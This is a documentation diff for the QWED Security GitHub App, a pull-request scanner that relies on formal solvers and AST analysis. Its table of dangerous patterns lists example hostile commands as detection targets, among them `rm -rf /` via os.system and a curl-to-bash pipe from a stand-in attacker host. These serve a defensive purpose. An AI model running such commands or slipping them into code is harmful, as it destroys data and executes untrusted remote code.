@@ -2,18 +2,16 @@
 title: "QWED Security GitHub App"
 description: "QWED Security GitHub App scans pull requests using formal solvers (SymPy, Z3) and AST analysis to mathematically prove code, math, and logic correctness."
 ---
-# QWED Security GitHub App
-
 
 QWED Security is a **GitHub App** that automatically scans your Pull Requests using deterministic verification engines — not another LLM. It uses formal solvers (SymPy, Z3) and AST analysis to **mathematically prove** that code, math, and logic in your PRs are correct.
 
 <Tip>
-**Unlike AI code reviewers that "guess," QWED Security provides deterministic proof. 1+1 always equals 2.**
+  **Unlike AI code reviewers that "guess," QWED Security provides deterministic proof. 1\+1 always equals 2.**
 </Tip>
 
 ## How It Works
 
-```
+```text
 Pull Request Opened / Updated
         ↓
 GitHub Webhook → QWED Security App
@@ -42,10 +40,10 @@ Results posted as a GitHub Check Run
 Detects dangerous code patterns before they reach production:
 
 | Pattern | Example | Risk |
-|---------|---------|------|
+| --- | --- | --- |
 | Shell injection | `os.system('rm -rf /')` | Remote Code Execution |
 | Eval/Exec | `eval(user_input)` | Arbitrary code execution |
-| Pipe-to-shell | `curl http://evil.com \| bash` | Supply chain attack |
+| Pipe-to-shell | `curl http://evil.com | bash` | Supply chain attack |
 | Hardcoded secrets | `api_key = "sk-proj-..."` | Credential exposure |
 | Unsafe imports | `import subprocess` | Privilege escalation |
 
@@ -69,14 +67,14 @@ Detects sensitive data before it enters your codebase — credit card numbers, S
 4. Done — QWED Security will automatically scan new Pull Requests
 
 <Tip>
-The app is currently under GitHub publishing review. You can still use the direct app link for installation and updates.
+  The app is currently under GitHub publishing review. You can still use the direct app link for installation and updates.
 </Tip>
 
 ### Plans
 
 | Plan | Scope | Price |
-|------|-------|-------|
-| **Free** | Open source & personal repositories | $0 |
+| --- | --- | --- |
+| **Free** | Open source & personal repositories | \$0 |
 | **Pro** | Private repositories, priority scanning | Coming soon |
 
 ## Check Run Output
@@ -84,7 +82,8 @@ The app is currently under GitHub publishing review. You can still use the direc
 When QWED Security scans a PR, you'll see results directly in the **Checks tab**:
 
 ### ✅ All Clear
-```
+
+```text
 QWED Verification Report
 
 ✅ Verified Files
@@ -93,7 +92,8 @@ QWED Verification Report
 ```
 
 ### ❌ Issues Found
-```
+
+```text
 QWED Verification Report
 
 🚨 Issues Detected
@@ -114,7 +114,7 @@ QWED Verification Report
 ## Permissions
 
 | Permission | Access | Purpose |
-|-----------|--------|---------|
+| --- | --- | --- |
 | **Checks** | Read & Write | Create and update Check Runs on PRs |
 | **Pull Requests** | Read | Read PR metadata and trigger scans |
 | **Contents** | Read | Read repository files for verification |
@@ -129,7 +129,7 @@ QWED Security works **out-of-the-box** with zero configuration for Python projec
 ## QWED Security App vs GitHub Action
 
 | Feature | QWED Security (App) | QWED GitHub Action |
-|---------|---------------------|-------------------|
+| --- | --- | --- |
 | **Type** | Installed GitHub App | CI/CD Action |
 | **Setup** | One-click install | Add to workflow YAML |
 | **Trigger** | Automatic on PR | Configured in workflow |
